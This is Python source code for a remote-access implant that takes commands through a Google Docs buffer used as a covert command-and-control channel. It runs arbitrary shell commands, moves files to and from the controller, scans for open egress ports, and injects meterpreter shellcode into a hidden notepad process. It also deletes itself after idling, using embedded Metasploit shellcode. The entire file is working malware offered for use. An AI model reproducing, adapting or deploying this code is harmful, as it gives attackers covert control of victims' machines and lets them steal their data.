#!/usr/bin/python
import subprocess
from time import sleep
from time import time
from hashlib import md5
import os
import platform
import logging
import ctypes
import random
from getpass import getuser
import sys
from gdoc_buffer import gdocServerBuffer
import socket
import threading
import Queue
from imp import is_frozen

VERSION = 1.1
TIMEOUT = 48 # Idle Hours Before Self Removal
SECPERHOUR = 3600
BLOCKSIZE=2**10
DEBUG = False

local_os = platform.system()
egress_port = [] # Shared global for egress_bust threads

logger = logging.getLogger('__docSERVER__')
if not DEBUG:
    logger.setLevel(logging.ERROR)
else:
    logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
if not DEBUG:
    ch.setLevel(logging.ERROR)
else:
    ch.setLevel(logging.NOTSET)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)



def main_is_frozen():
    """Return freeze detection Bool
    
    From www.py2exe.org/index.cgi/HowToDetermineIfRunningFromExe
    ThomasHeller posted to the py2exe mailing list
    """
    return (hasattr(sys, "frozen") or # new py2exe
            hasattr(sys, "importers") # old py2exe
            or is_frozen("__main__")) # tools/freeze
   
    
### Delay Backoff and Removal Timers ###
def timed_out(last_cmd_time):
    """Check for C2 timed out, True triggers clean_up() in main()"""
    if int(time() - last_cmd_time) >= (TIMEOUT * SECPERHOUR):
        return True
    return False

                  
def get_delay(delay_counter):
    """Command polling back-off interval"""
    delay = 0.5
    if delay_counter > 0 and delay_counter <= 5:
        delay = 1
    elif delay_counter > 5 and delay_counter <= 10:
        delay = 2
    elif delay_counter > 10 and delay_counter <= 20:
        delay = 4
    elif delay_counter > 20 and delay_counter <= 30:
        delay = 6
    elif delay_counter > 30 and delay_counter <= 40:
        delay = 8  + randint(0,2)
    elif delay_counter > 40 and delay_counter <= 60:
        delay = 10  + randint(0,3)
    elif delay_counter > 60 and delay_counter <= 90:
        delay = 15  + randint(0,4)
    elif delay_counter > 90 and delay_counter <= 250:
        delay = 20  + randint(0,5)
    elif delay_counter > 250:
        delay = 30 + randint(0,10)    
    return delay


### Command Parsing and Exec ###
def process_cmd(doc_buffer, command_str):
    """Parse and hand off command to method
    
    Exec builtin static commands
    Exec builting parsed commands
    Or pass non-builtin to system specific shell
    Return stdOut and/or stdErr to client via buffer
    """
    static_cmds = ["!sysinfo", "!sync", "!shutdown", "!cleanup"] # Static builtins
    if command_str in static_cmds:
        if command_str == "!sysinfo":
            return (syscheck())
        elif command_str == "!sync":
            return doc_buffer.sync_up()
        elif command_str == "!shutdown":
            doc_buffer.send_data("<GOTSHUT>")
            os._exit(0) # aggressive exit
        elif command_str == "!cleanup":
            return clean_up()
    
    elif command_str.startswith('!download'): # Parsed builtins
        return download(doc_buffer, command_str)  
    elif command_str.startswith('!upload'):
        return upload(doc_buffer, command_str) 
    elif command_str.startswith('!egress'):
        return egress_bust(doc_buffer, command_str)
    elif command_str.startswith('!meterup'):
        return meter_up(command_str);
    elif command_str.startswith('!forward'):
        return forward_port(doc_buffer, command_str)
         
    else: # OS specific shell exec   
        try:  
            if local_os == 'Linux':
                return nix_exec_cmd(command_str)      
            elif local_os == 'Windows':
                return win_exec_cmd(command_str)
            elif local_os == 'OSX':
                return osx_exec_cmd(command_str)            
        except:
            logger.debug('process_cmd(): Execution error for command: \"' + command_str +'\"')


def win_exec_cmd(commands_in):
    """WINDOWS shell exec 
    
    Execute raw shell command via cmd subprocess
    shell=True allows for redirection and pipes
    """
    #cmdLine = ['cmd', '/q' '/k'] + commands_in.split()
    try:
        process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()
        if output[1] == '':
            return output[0]
        elif output[0] and output[1]:
            return output[0] + output[1]
        else:
            return output[1]
    except OSError:
        return "\nERROR: OSError"
  

def nix_exec_cmd(commands_in):
    """LINUX shell exec 
    
    Execute raw command via env-shell subprocess 
    shell=True, assumes trusted input
    allows for pipes and redirection. IO: sto, ste
    """
    try:
        process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()    
        if output[1] == '':
            return output[0]
        elif output[0] and output[1]:
            return output[0] + output[1]
        else:
            return output[1]    
    except OSError as e:
        return "\nERROR: OSError: %s" % e


def osx_exec_cmd(commands_in):
    """OSX shell exec
    
    Not implemented / tested
    TODO: Test on OSX
    """
    try:
        process = subprocess.Popen(commands_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate()    
        if output[1] == '':
            return output[0]
        elif output[0] and output[1]:
            return output[0] + output[1]
        else:
            return output[1]    
    except OSError:
        return "\nERROR: OSError"


### File Transfer ###     
def upload(doc_buffer, file_str):
    """Receives file pushed from controlling client"""
    up_cmd_list = file_str.split('.')
    write_file = up_cmd_list[1].decode('base64','strict')
    write_file = os.path.expandvars(write_file)
    logger.debug("write_file is: " + write_file)
    tmp_file = write_file + ".tmp"
    exist_before = os.path.exists(write_file)

    try:
        #check local file
        fd = open(write_file,"wb")
        fd.close()
        
        tmp_fd = open(tmp_file,"wb")
        doc_buffer.send_data("<OKAYSND>")
        md5_obj = md5()
        
        raw_data = doc_buffer.read_data()
        data_list = raw_data.split('.')
        if data_list[0] != "<BOF>":
            return "ERROR: upload() - Data BOF format error."
        bin_data = data_list[1].decode('base64','strict') 
        tmp_fd.write(bin_data)      
        md5_obj.update(bin_data)
        
        while bin_data != "<EOF>" :
            bin_data = doc_buffer.read_data()
            if bin_data == "<READ>" or bin_data == "<NULL>":
                pass 
            elif bin_data.startswith("<EOF>"):
                tmp_fd.close()
                data_list = bin_data.split(".")
                bin_data = data_list[0]
                file_hash = data_list[1]
                if file_hash == md5_obj.digest().encode('base64','strict'):
                    if os.path.exists(write_file):
                            os.remove(write_file)
                    os.rename(tmp_file, write_file)
                    return "<OKAYRCV>"  
                else:
                    if os.path.exists(tmp_file):
                            os.remove(tmp_file)
                    if not exist_before and os.path.exists(write_file):
                        os.remove(write_file) 
                    return "<OKAYFAIL>"      
            else:      
                bin_data = bin_data.decode('base64','strict')
                md5_obj.update(bin_data)
                tmp_fd.write(bin_data)                          
    except IOError:
        if not exist_before and os.path.exists(write_file):
            os.remove(write_file)
        if os.path.exists(tmp_file):
            os.remove(tmp_file)
        return "File Access Error"


def download(doc_buffer, file_str):
    """Push requested file to controlling host"""
    local_path = file_str.split(".")[1].decode('base64','strict').strip('\n')
    local_path = os.path.expandvars(local_path)
    if os.path.exists(local_path):
        try:
            fd = open(local_path,"rb")
            file_size = str( os.path.getsize(local_path) )
            doc_buffer.send_data("<OKAYRCV>." + file_size)
            md5_obj = md5()

            data = fd.read(BLOCKSIZE)
            md5_obj.update(data)
            doc_buffer.send_data("<BOF>." + data.encode('base64','strict') )   
            while True:
                data = fd.read(BLOCKSIZE)
                if not data:
                    file_hash = md5_obj.digest().encode('base64','strict')
                    doc_buffer.send_data("<EOF>." + file_hash )
                    return "<NULL>"
                #Anti-Clobber
                to_write = doc_buffer.SERVER_WRITE_COL + str(doc_buffer.get_to_write())
                current_data = doc_buffer.get_cell_data(to_write)
                while(current_data != "<NULL>" and current_data != "<READ>"):
                    sleep(1)
                    current_data = doc_buffer.get_cell_data(doc_buffer.to_write)
                         
                md5_obj.update(data)    
                doc_buffer.send_data(data.encode('base64','strict') )                                 
        except IOError:
            return "ERROR: cannot read file: " + local_path
    else:
        return "ERROR: remote file path does not exist."


### Shell Upgrades ###
class scannerThread(threading.Thread):
    """Worker thread class for egress port check"""
    def __init__(self, port_check_queue, egress_ip):
        threading.Thread.__init__(self)
        self.port_queue = port_check_queue
        self.egress_ip = egress_ip
         
    def run(self):
        global egress_port #Not thread safe, will work, can't guarantee to return FIRST port found.
        while (not self.port_queue.empty()) and (len(egress_port) == 0):
            port = 0
            try:
                port = self.port_queue.get(timeout = 1)
            except Queue.Empty:
                return
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            serverAddress = (self.egress_ip, int(port))
            try:
                sock.connect(serverAddress)
                sock.close()
                egress_port.append(port)
                self.port_queue.task_done()
            except (socket.timeout, socket.error):
                self.port_queue.task_done()
                if sock:
                    sock.close()

def egress_bust(doc_buffer, cmd_str):
    """Find open egress port to external IP4 address
    
    Expand List  of ports
    Create queue containing ports to check
    Launches worker threads
    return open port assigned to egress_port List in parsible string
    """
    global egress_port
    egress_port = [] #clear last check
    cmd_list = cmd_str.split("|")
    port_list = []
    egress_ip = cmd_list[2]  
    thread_count = int(cmd_list[3])
    
    if "-" in cmd_list[1]: # expand and shuffle
        try:
            min_port, max_port = cmd_list[1].split("-")
        except:
            return "<egress>.<failed>"
        port_list = list(( str(port) for port in range(int(min_port), int(max_port) + 1) ))
        random.shuffle(port_list)
    else:
        port_list = cmd_list[1].split(",")    
    doc_buffer.send_data("<egress>.<started>.<%s>" % len(port_list))
    
    try: # create port job queque
        port_check_queue = Queue.Queue()
        for port in port_list:
            port_check_queue.put(int(port))          
        threads = []
        for thread_obj in range(1, thread_count +  1) : # create worker threads and list handle
            worker = scannerThread(port_check_queue, egress_ip) 
            worker.setDaemon(True)
            worker.start()
            threads.append(worker) 
        for worker in threads : # wait for all threads to return
            worker.join()
        if len(egress_port) > 0:
            return "<egress>.<open>.<%s>" % egress_port[0] 
        else:
            return "<egress>.<closed>"
    except:
        return "<egress>.<failed>"


def inject_shellcode(shellcode):
    """Inject shellcode
    
    Uses remote thread to inject provided shellcode 
    into windowless process in new process group.
    injection code modeled modeled after work by Debasish Mandal @ http://www.debasish.in
    """
    shellcode = bytearray(shellcode)   
    c_buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    PROCESS_ALL_ACCESS = (0x000F0000L|0x00100000L|0xFFF)
 
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW # Start remote process windowless
        process = subprocess.Popen(['notepad.exe'], startupinfo=startupinfo, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)        
        pid = process.pid
        logger.debug("Got an process ID of " + str(pid))
        sleep(1)
        
        proc_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        logger.debug("Got Handle SUCCEEDED: " + str(proc_handle) )
         
        valloc_address = ctypes.windll.kernel32.VirtualAllocEx(proc_handle, None, len(shellcode), 0x1000, 0x40)
        logger.debug("Got shellcode address SUCCEEDED: " + str(valloc_address) )
         
        ctypes.windll.kernel32.WriteProcessMemory(proc_handle, valloc_address, c_buffer, len(shellcode), None)
        logger.debug("WriteProcessMemory SUCCEEDED")
         
        ctypes.windll.kernel32.CreateRemoteThread(proc_handle, None, 0, valloc_address, None, 0, None)
        logger.debug("CreatedRemoteThread SUCCEEDED\n")
        return "Payload injected"
    
    except Exception:
        return "Injection Failed"
    

def meter_up(command_string):
    """meterpreter shellcode decoder stub"""
    return inject_shellcode( command_string.split('.')[1].decode("base64", "strict") )


def forward_port(doc_buffer, command_string):
    """Forward TCP Socket inside tunnel, unavailable in public release"""
    return "Function not available"


### Management Settings and Cleanup ###
def clean_up():
    """Kills server and removes from disk
    
    Axquires pid, state(PE || script) and path
    set up cmd to kill PID and remove from disk
    Uses remote thread injection to exec cmd, bypassing lock on running file 
    
    TODO: Test on 64x 
    TODO: Create Posix double fork clean up
    TODO: May want to obfuscate shellcode in this method
    TOOO: Overwrite file before del
    """
    parent_pid = str(os.getpid())
    if main_is_frozen():
        parent_path = sys.executable
    else:
        parent_path = os.path.abspath(__file__)
    parent_path = '"' + parent_path + '"' #handle paths with spaces, ^ escape wont

    logger.debug("Got ParentPath of " + parent_path )   
    logger.debug("Got ParentPid of " + parent_pid ) 
    
    cmd_string = 'cmd /c taskkill /F /PID > nul ' + parent_pid + ' && ping 1.1.1.1 -n 1 -w 500 > nul & del /F /Q ' + parent_path

    """Windows Exec Shellcode Sourced from the Metasploit Framework 
    
    http://www.rapid7.com/db/modules/payload/windows/exec
    Authors - vlad902 <vlad902 [at] gmail.com>, sf <stephen_fewer [at] harmonysecurity.com>
 
    I have modified "\x6a\x01" push 01 to "\x6a\x00" push 00 to unset uCmdShow
    UINT WINAPI WinExec(
                         _In_  LPCSTR lpCmdLine,
                         _In_  UINT uCmdShow <-- changed value to 0 
                        );
    """
    shell_code = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
    "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
    "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + \
    "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" + \
    "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" + \
    "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" + \
    "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" + \
    "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" + \
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" + \
    "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" + \
    "\x12\xeb\x86\x5d\x6a\x00\x8d\x85\xb9\x00\x00\x00\x50\x68" + \
    "\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95" + \
    "\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" + \
    "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5" + cmd_string + "\x00"   
    inject_shellcode(shell_code)


def syscheck():
    """Return List of formated System Information"""
    sysinfo = []
    sysinfo.append("local_os      : " + local_os)
    sysinfo.append("FAMILY  : " + os.name)
    sysinfo.append("RELEASE : " + platform.release())
    sysinfo.append("PLAT    : " + platform.platform())
    sysinfo.append("ARCH    : " + platform.machine())
    sysinfo.append("HOST    : " + platform.node())
    sysinfo.append("UNAME   : " + getuser())
    if local_os == "Windows" :
        sysinfo.append("UID     : NULL")
    elif local_os == "Linux" : 
        sysinfo.append("UID     : " + str(os.geteuid()))
    sysinfo.append("PID     : " + str(os.getpid()))
    return str(sysinfo)

 
def main():
    delay_counter = 0
    last_cmd_time = time()

    try:
        doc_buffer = gdocServerBuffer() # Instantiate buffer object
        doc_buffer.buffer_init("client", "<NULL>")

        while not timed_out(last_cmd_time): # process commands until timeout time
            client_data = doc_buffer.read_data()
            logger.debug("DEBUG - Got Command: " + client_data)
            if not client_data.startswith("ERROR: read timed out."):               
                command_output = process_cmd(doc_buffer, client_data)        
                doc_buffer.send_data(command_output)
                last_cmd_time = time()
                delay_counter = 0
            sleep(get_delay(delay_counter))
            delay_counter += 1
            logger.debug('Delay counter: ' + str(delay_counter) + ' slept for %s seconds' % get_delay(delay_counter))
        
        logger.debug('DEBUG - clean_up() on timeOut() Trigger')
        if not DEBUG:
            clean_up()
            sleep(10)
        
    except Exception as e:
        logger.debug('DEBUG: clean_up() Main() Exception Trigger on %s' % e)
        if not DEBUG:
            clean_up()
      
      
if __name__ == "__main__":
    main()
